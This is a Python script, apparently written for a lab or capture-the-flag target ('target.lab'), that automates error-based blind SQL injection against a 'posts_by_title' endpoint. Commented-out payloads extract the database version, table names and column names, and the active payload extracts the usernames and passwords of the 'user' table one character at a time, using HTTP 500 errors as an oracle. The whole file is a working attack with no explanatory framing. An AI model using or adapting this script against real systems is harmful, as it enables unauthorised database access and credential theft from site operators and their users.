import requests
import string
# ' AND 1 = (SELECT CASE WHEN ((SELECT SUBSTRING(version(),1,1))='a') THEN 1/(SELECT 0) ELSE NULL END) ;-- -
# ' AND 1 = (SELECT CASE WHEN ((SELECT SUBSTRING(version(),1,1))='a') THEN 1/(SELECT 0) ELSE NULL END) ;-- -

# url = "	http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT SUBSTRING(version(),!OFFSET!,1))='!CHAR!') THEN 1/(SELECT 0) ELSE NULL END) ;-- -"
# lenurl = "	http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT LENGTH(version()))='!LENGTH!') THEN 1/(SELECT 0) ELSE NULL END) ;-- -"

# url = "http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT SUBSTRING(table_name,!OFFSET!,1) FROM information_schema.tables OFFSET 2 LIMIT 1)='!CHAR!') THEN 1/(SELECT 0) ELSE NULL END) ;-- -"
# lenurl = "http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT LENGTH(table_name) FROM information_schema.tables OFFSET 2 LIMIT 1)='!LENGTH!')THEN 1/(SELECT 0) ELSE NULL END) ;-- -"

# url = "http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT SUBSTRING(column_name,!OFFSET!,1) FROM information_schema.columns WHERE table_name='user' OFFSET !MAINOFFSET! LIMIT 1)='!CHAR!') THEN 1/(SELECT 0) ELSE NULL END) ;-- -"
# lenurl = "http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='user' OFFSET !MAINOFFSET! LIMIT 1)='!LENGTH!')THEN 1/(SELECT 0) ELSE NULL END) ;-- -"

# url = "http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT SUBSTRING(username,!OFFSET!,1) FROM \"user\" OFFSET !MAINOFFSET! LIMIT 1)='!CHAR!') THEN 1/(SELECT 0) ELSE NULL END) ;-- -"
# lenurl = "http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT LENGTH(username) FROM \"user\" OFFSET !MAINOFFSET! LIMIT 1)=!LENGTH!) THEN 1/(SELECT 0) ELSE NULL END) ;-- -"

url = "http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT SUBSTRING(password,!OFFSET!,1) FROM \"user\" OFFSET !MAINOFFSET! LIMIT 1)='!CHAR!') THEN 1/(SELECT 0) ELSE NULL END) ;-- -"
lenurl = "http://target.lab:5000/posts_by_title?title=' AND 1 = (SELECT CASE WHEN ((SELECT LENGTH(password) FROM \"user\" OFFSET !MAINOFFSET! LIMIT 1)=!LENGTH!) THEN 1/(SELECT 0) ELSE NULL END) ;-- -"

for main_offset in range(0,100):
    string_length = -1
    for length in range(0,1000):
        new_url = lenurl.replace("!LENGTH!", str(length))
        new_url = new_url.replace("!MAINOFFSET!", str(main_offset))
        res = requests.request(url=new_url, method="GET")
        if res.status_code == 500:
            string_length = length
            break

    if string_length == -1:
        break
    print(f"\nLength: {string_length}")

    for offset in range(0,string_length+1):   
        for character in string.printable:
            if character in "'&#":
                continue
            new_url = url.replace("!CHAR!", character)
            new_url = new_url.replace("!OFFSET!", str(offset))
            new_url = new_url.replace("!MAINOFFSET!", str(main_offset))
            res = requests.request(url=new_url, method="GET")
            if res.status_code == 500:
                print(character, end="")
                break